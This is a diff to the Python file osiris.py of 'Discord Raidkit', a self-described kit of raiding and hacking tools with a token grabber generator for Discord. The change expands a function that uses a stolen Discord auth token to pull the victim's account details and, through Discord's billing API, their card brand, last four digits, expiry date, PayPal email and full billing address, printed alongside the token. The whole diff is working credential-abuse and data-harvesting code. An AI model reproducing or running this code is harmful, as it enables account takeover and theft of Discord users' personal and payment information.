@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
+Discord Raidkit v2.3.3 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,7 +8,7 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 osiris.py stores the Osiris program for Discord Raidkit.
-osiris.py was last updated on 06/09/22 at 16:38.
+osiris.py was last updated on 25/09/22 at 01:41.
 """
 
 import logging
@@ -226,19 +226,54 @@ if __name__ == "__main__":
             return f'Error in osiris.py - generate_grabber(): {e}'
 
     def get_account_info(self) -> str:
-        b, r = self.check_auth()
-        if b:
-            user_name = f'{r.json()["username"]}#{r.json()["discriminator"]}'
-            user_id = r.json()["id"]
-            phone = r.json()["phone"]
-            email = r.json()["email"]
-            mfa = r.json()["mfa_enabled"]
-            return f'''[User ID]\t\t{user_id}
-[User Name]\t\t{user_name}
-[2 Factor]\t\t{mfa}
-[Email]\t\t\t{email}
-[Phone number]\t{phone if phone else ''}
-[Token]\t\t\t{self.auth}'''
+        check, std_response = self.check_auth()
+        if check:
+            user_name = f'{std_response.json()["username"]}#{std_response.json()["discriminator"]}'
+            user_id = std_response.json()["id"]
+            phone = std_response.json()["phone"]
+            email = std_response.json()["email"]
+            mfa = std_response.json()["mfa_enabled"]
+            
+            # Spacing: "[...] x" <= "[...] " = 20 characters
+            # i.e. x always starts at 20th character
+            
+            info = f'''Account Information
+{"*"*19}
+
+[User ID]{' '*11}{user_id}
+[User Name]{' '*9}{user_name}
+[2 Factor]{' '*10}{mfa}
+[Email]{' '*13}{email}
+[Phone number]{' '*6}{phone if phone else ''}'''
+            
+            headers = {"Authorization": self.auth, "Content-Type": "application/json"}
+            bill_sources_response = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
+            user_has_nitro = bool(requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions',  headers=headers).json())
+            
+            if bool(bill_sources_response):
+                info += f'\n\nBilling Information\n{"*"*19}\n\n'
+                for source_data in bill_sources_response:
+                    info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}'
+                    if source_data['type'] == 1 or source_data['type'] == 2:
+                        if source_data['type'] == 1:
+                            info += f'[Card Brand]{" "*8}{source_data["brand"]}\n'
+                            info += f'[Last 4 Digits]{" "*5}{source_data["last_4"]}\n'
+                            info += f'[Expiry Date]{" "*7}{source_data["expires_month"]}/{source_data["expires_year"]}\n'
+                        
+                        if source_data['type'] == 2:
+                            info += f'[PayPal Email]{" "*6}{source_data["email"]}'
+                        
+                        info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
+                        info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
+                        info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
+                        info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
+                        info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
+                        info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
+                        info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
+                    else:
+                        info += f'None'
+                info += f'\n[Token]{" "*13}{self.auth}'
+            return info
         else:
             return 'User authentication token is not valid!'
 
